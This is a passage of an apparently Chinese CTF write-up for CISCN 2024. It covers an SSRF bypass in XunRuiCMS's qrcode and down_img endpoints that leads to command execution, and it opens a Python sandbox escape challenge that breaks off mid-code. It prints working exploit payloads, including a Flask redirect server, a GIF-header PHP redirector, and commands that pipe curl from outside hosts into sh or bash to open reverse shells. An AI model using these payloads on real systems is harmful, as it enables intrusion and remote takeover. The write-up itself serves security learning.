alt="image-20240519111253356"></p><p>一路跟到这里，没收获</p><p>Thread.php</p><p><img src="/blog/2024/05/18/CISCN2024/image-20240519111611629.png" alt="image-20240519111611629"></p><p>没地方调用</p><p>Ueditor.php</p><p>没地方调用</p><p>Member.php</p><p>没地方调用</p><p>至此前台的所有方法全寄了</p><p>还是尝试爆后台路由吧，续了三次靶机，怎么可能爆出来（</p><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>那怎么办？拿前一天的payload再打一次，结果发现这次连自己内网穿透的php服务都没访问到。。。</p><p>赛后问了一下，好像前一天的洞确实没修，于是借了个vps，测了一下能出网，打payload：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">/</span>index<span class="token operator">.</span>php<span class="token operator">?</span>s<span class="token operator">=</span>api<span class="token operator">&amp;</span>c<span class="token operator">=</span>api<span class="token operator">&amp;</span>m<span class="token operator">=</span>qrcode<span class="token operator">&amp;</span>thumb<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token comment">//your-vps/exp.php&amp;text=abcd&amp;size=1024&amp;level=1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后弹shell，现在能访问到php了，但是弹了半天弹不出来，不知道是不是curl和bash没了</p><p>赛后问了一下有dump源码的师傅看了一下api.php到底在搞什么（结果ctfshow那边复现不出来。。）</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">/</span>dayrui<span class="token operator">/</span>Fcms<span class="token operator">/</span>Control<span class="token operator">/</span>Api<span class="token operator">/</span>Api<span class="token operator">.</span>php<span class="token comment">/** * 二维码显示 */</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">qrcode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>     <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token class-name class-name-fully-qualified static-context"><span class="token punctuation">\</span>Phpcmf<span class="token punctuation">\</span>Service</span><span class="token operator">::</span><span class="token function">L</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'input'</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'text'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$thumb</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token class-name class-name-fully-qualified static-context"><span class="token punctuation">\</span>Phpcmf<span class="token punctuation">\</span>Service</span><span class="token operator">::</span><span class="token function">L</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'input'</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'thumb'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$matrixPointSize</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span><span class="token class-name class-name-fully-qualified static-context"><span class="token punctuation">\</span>Phpcmf<span class="token punctuation">\</span>Service</span><span class="token operator">::</span><span class="token function">L</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'input'</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'size'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$errorCorrectionLevel</span> <span class="token operator">=</span> <span class="token function">dr_safe_replace</span><span class="token punctuation">(</span><span class="token class-name class-name-fully-qualified static-context"><span class="token punctuation">\</span>Phpcmf<span class="token punctuation">\</span>Service</span><span class="token operator">::</span><span class="token function">L</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'input'</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'level'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">//生成二维码图片</span>    <span class="token keyword">require_once</span> <span class="token constant">CMSPATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'Library/Phpqrcode.php'</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token constant">WRITEPATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'file/qrcode-'</span> <span class="token operator">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$value</span> <span class="token operator">.</span> <span class="token variable">$thumb</span> <span class="token operator">.</span> <span class="token variable">$matrixPointSize</span> <span class="token operator">.</span> <span class="token variable">$errorCorrectionLevel</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'-qrcode.png'</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant boolean">false</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token constant">IS_DEV</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$QR</span> <span class="token operator">=</span> <span class="token function">imagecreatefrompng</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token class-name class-name-fully-qualified static-context"><span class="token punctuation">\</span>QRcode</span><span class="token operator">::</span><span class="token function">png</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token variable">$errorCorrectionLevel</span><span class="token punctuation">,</span> <span class="token variable">$matrixPointSize</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'二维码生成失败'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token variable">$QR</span> <span class="token operator">=</span> <span class="token function">imagecreatefromstring</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$thumb</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$thumb</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'https://'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span>                <span class="token operator">&amp;&amp;</span> <span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$thumb</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'/'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span>                <span class="token operator">&amp;&amp;</span> <span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$thumb</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'http://'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'图片地址不规范'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$parts</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$thumb</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$hostname</span> <span class="token operator">=</span> <span class="token variable">$parts</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token function">gethostbyname</span><span class="token punctuation">(</span><span class="token variable">$hostname</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token variable">$port</span> <span class="token operator">=</span> <span class="token variable">$parts</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'port'</span><span class="token punctuation">]</span> <span class="token operator">??</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>            <span class="token variable">$newUrl</span> <span class="token operator">=</span> <span class="token variable">$parts</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'://'</span> <span class="token operator">.</span> <span class="token variable">$ip</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$port</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$newUrl</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">':'</span> <span class="token operator">.</span> <span class="token variable">$port</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$newUrl</span> <span class="token operator">.=</span> <span class="token variable">$parts</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'path'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$parts</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$newUrl</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'?'</span> <span class="token operator">.</span> <span class="token variable">$parts</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>             <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">filter_var</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token constant">FILTER_VALIDATE_IP</span><span class="token punctuation">,</span> <span class="token class-name">FILTER_FLAG_NO_PRIV_RANGE</span> <span class="token operator">|</span> <span class="token class-name">FILTER_FLAG_NO_RES_RANGE</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ip不正确"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>             <span class="token variable">$context</span> <span class="token operator">=</span> <span class="token function">stream_context_create</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'http'</span> <span class="token operator">=></span> <span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'follow_location'</span> <span class="token operator">=></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$img</span> <span class="token operator">=</span> <span class="token function">getimagesizefromstring</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$newUrl</span><span class="token punctuation">,</span> <span class="token constant boolean">false</span><span class="token punctuation">,</span> <span class="token variable">$context</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$img</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'此图片不是一张可用的图片'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token function">dr_catcher_data</span><span class="token punctuation">(</span><span class="token variable">$newUrl</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$code</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'图片参数不规范'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$logo</span> <span class="token operator">=</span> <span class="token function">imagecreatefromstring</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$QR_width</span> <span class="token operator">=</span> <span class="token function">imagesx</span><span class="token punctuation">(</span><span class="token variable">$QR</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//二维码图片宽度</span>            <span class="token variable">$logo_width</span> <span class="token operator">=</span> <span class="token function">imagesx</span><span class="token punctuation">(</span><span class="token variable">$logo</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//logo图片宽度</span>            <span class="token variable">$logo_height</span> <span class="token operator">=</span> <span class="token function">imagesy</span><span class="token punctuation">(</span><span class="token variable">$logo</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//logo图片高度</span>            <span class="token variable">$logo_qr_width</span> <span class="token operator">=</span> <span class="token variable">$QR_width</span> <span class="token operator">/</span> <span class="token number">4</span><span class="token punctuation">;</span>            <span class="token variable">$scale</span> <span class="token operator">=</span> <span class="token variable">$logo_width</span> <span class="token operator">/</span> <span class="token variable">$logo_qr_width</span><span class="token punctuation">;</span>            <span class="token variable">$logo_qr_height</span> <span class="token operator">=</span> <span class="token variable">$logo_height</span> <span class="token operator">/</span> <span class="token variable">$scale</span><span class="token punctuation">;</span>            <span class="token variable">$from_width</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$QR_width</span> <span class="token operator">-</span> <span class="token variable">$logo_qr_width</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>            <span class="token comment">//重新组合图片并调整大小</span>            <span class="token function">imagecopyresampled</span><span class="token punctuation">(</span><span class="token variable">$QR</span><span class="token punctuation">,</span> <span class="token variable">$logo</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span><span class="token variable">$from_width</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span><span class="token variable">$from_width</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span><span class="token variable">$logo_qr_width</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span><span class="token variable">$logo_qr_height</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span><span class="token variable">$logo_width</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span><span class="token variable">$logo_height</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">imagepng</span><span class="token punctuation">(</span><span class="token variable">$QR</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>     <span class="token comment">// 输出图片</span>    <span class="token function">ob_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">ob_clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-type: image/png"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$QR</span> <span class="token operator">&amp;&amp;</span> <span class="token function">imagepng</span><span class="token punctuation">(</span><span class="token variable">$QR</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">exit</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/05/18/CISCN2024/image-20240519171837522.png" alt="image-20240519171837522"></p><p>就单纯把hostname换成了ip，但是内网穿透的那个ip不能直接访问80端口。。。wdnmd</p><p>（后日谈：这个好像是官方网站的源码）</p><p>但是最要命的是这里：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$context</span> <span class="token operator">=</span> <span class="token function">stream_context_create</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'http'</span> <span class="token operator">=></span> <span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'follow_location'</span> <span class="token operator">=></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$img</span> <span class="token operator">=</span> <span class="token function">getimagesizefromstring</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$newUrl</span><span class="token punctuation">,</span> <span class="token constant boolean">false</span><span class="token punctuation">,</span> <span class="token variable">$context</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这样一来我们就不能用 302 了, 但是我们还有办法：</p><p>在上一题中这里是</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$img</span> <span class="token operator">=</span> <span class="token function">getimagesize</span><span class="token punctuation">(</span><span class="token variable">$thumb</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>getimagesize</code> 似了, 我们还有 <code>dr_catcher_data</code> </p><p>只是我们要保证靶机第一次访问的时候，也就是调用 file_get_contents 的时候，我们得返回正常的图片</p><p>即绕过</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$img</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'此图片不是一张可用的图片'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>只有这样，靶机才能调用 <code>dr_catcher_data</code> ，进行第二次访问，由于第二次访问还是不会检测 302 的，就可以 getshell</p><p>exp：起python服务，直接curl <a href="https://reverse-shell.sh/">https://reverse-shell.sh</a>来弹</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> redirect app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span> Flag<span class="token operator">=</span><span class="token boolean">True</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">home</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> Flag    <span class="token keyword">if</span> Flag<span class="token punctuation">:</span>        Flag<span class="token operator">=</span><span class="token boolean">False</span>        <span class="token keyword">return</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'D3mo.jpg'</span><span class="token punctuation">,</span><span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">"http://127.0.0.1/flag.php?cmd=curl https://reverse-shell.sh/115.236.153.172:13314 | sh"</span><span class="token punctuation">)</span> <span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">777</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload：需要重复打两次才能弹shell</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">/</span>index<span class="token operator">.</span>php<span class="token operator">?</span>s<span class="token operator">=</span>api<span class="token operator">&amp;</span>c<span class="token operator">=</span>api<span class="token operator">&amp;</span>m<span class="token operator">=</span>qrcode<span class="token operator">&amp;</span>text<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>thumb<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token comment">//76135132qk.imdo.co/</span><span class="token operator">/</span>index<span class="token operator">.</span>php<span class="token operator">?</span>s<span class="token operator">=</span>api<span class="token operator">&amp;</span>c<span class="token operator">=</span>api<span class="token operator">&amp;</span>m<span class="token operator">=</span>qrcode<span class="token operator">&amp;</span>text<span class="token operator">=</span><span class="token number">2</span><span class="token operator">&amp;</span>thumb<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token comment">//76135132qk.imdo.co/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/blog/2024/05/18/CISCN2024/image-20240530004601422.png" alt="image-20240530004601422"></p><p>此解法适用于ctfshow的靶机</p><p><img src="/blog/2024/05/18/CISCN2024/image-20240530004928044.png" alt="image-20240530004928044"></p><p>实际没改，估计只是弹shell上的问题</p><hr><h3 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h3><p>思路来源于boogipop</p><p>前面也是扫出来个Readme.txt，给了我们官方的下载地址：<a href="https://www.xunruicms.com/down/">https://www.xunruicms.com/down/</a></p><p>然后发现在官方下的建站版源码比github上的源码东西还要多！</p><p>于是思路就变成了再挖一个洞，官方下载地址的源码里面还多了一个File.php存在控制器可以被触发</p><p><img src="/blog/2024/05/18/CISCN2024/image-20240529103403617.png" alt="image-20240529103403617"></p><p>但是<code>down</code>方法的开头依旧会进行鉴权，所以不可用</p><p>注意到刚才的File.php里有一个找远程图片的方法<code>down_img</code></p><p><img src="/blog/2024/05/18/CISCN2024/image-20240529105803683.png" alt="image-20240529105803683"></p><p>这里也有鉴权，但是我们本地调试的时候设两个变量跟一下看看</p><p><img src="/blog/2024/05/18/CISCN2024/image-20240529235240107.png" alt="image-20240529235240107"></p><p>发现这里的值都是空值，不会触发拦截，所以能绕过鉴权</p><p>至于ssrf点具体在哪里，跟了半天也不知道。。</p><p>payload：用curl来弹shell</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">/</span><span class="token operator">?</span>s<span class="token operator">=</span>api<span class="token operator">&amp;</span>c<span class="token operator">=</span>file<span class="token operator">&amp;</span>m<span class="token operator">=</span>down_imgvalue<span class="token operator">=</span><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string double-quoted-string">"http://127.0.0.1/flag.php?cmd=curl%24IFS%249http%3A%2F%2F8.130.24.188%3A8000%2F1.sh%7Csh"</span> alt<span class="token operator">=</span><span class="token string double-quoted-string">"Example Image"</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>因为ctfshow的复现环境存在鉴权，所以那边的预期解实际不可行！</p><hr><h3 id="解法三："><a href="#解法三：" class="headerlink" title="解法三："></a>解法三：</h3><p>有说法是图片头检测，直接加个图片头即可：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">// 设置响应头，指定内容类型为 GIF 图片</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Content-Type: image/gif'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 输出最小的 GIF89a 图片</span><span class="token keyword">echo</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'R0lGODlhAQABAIAAAAAAAP///ywAAAAAAQABAAACAUwAOw=='</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 刷新缓冲区并立即发送输出</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 等待一秒钟以确保浏览器接收到图片</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 发送 302 重定向头</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: http://127.0.0.1/flag.php?cmd=curl%20124.221.19.214:1314/poc1.html|bash"</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">,</span> <span class="token number">302</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 终止脚本执行</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但是ctfshow的环境打不出来</p><hr><h2 id="mossfern-复现"><a href="#mossfern-复现" class="headerlink" title="mossfern (复现)"></a>mossfern (复现)</h2><blockquote><p>python沙箱栈帧逃逸</p></blockquote><p>我前阵子刚学的栈帧逃逸啊。。。知道思路但是不会做</p><p>main.py</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">import</span> subprocess<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> jsonify<span class="token keyword">from</span> uuid <span class="token keyword">import</span> uuid1app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>runner <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/app/runner.py"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/flag"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>post</span><span class="token punctuation">(</span><span class="token string">"/run"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token builtin">id</span> <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>uuid1<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        data <span class="token operator">=</span> request<span class="token punctuation">.</span>json        <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"/app/uploads/</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">id</span><span class="token punctuation">&#125;</span></span><span class="token string">.py"</span></span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>            runner<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"THIS_IS_SEED"</span><span class="token punctuation">,</span> flag<span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"THIS_IS_TASK_RANDOM_ID"</span><span class="token punctuation">,</span> <span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"/app/uploads/</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">id</span><span class="token punctuation">&#125;</span></span><span class="token string">.txt"</span></span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"UTF-8"</span><span class="token punctuation">)</span><span class="token 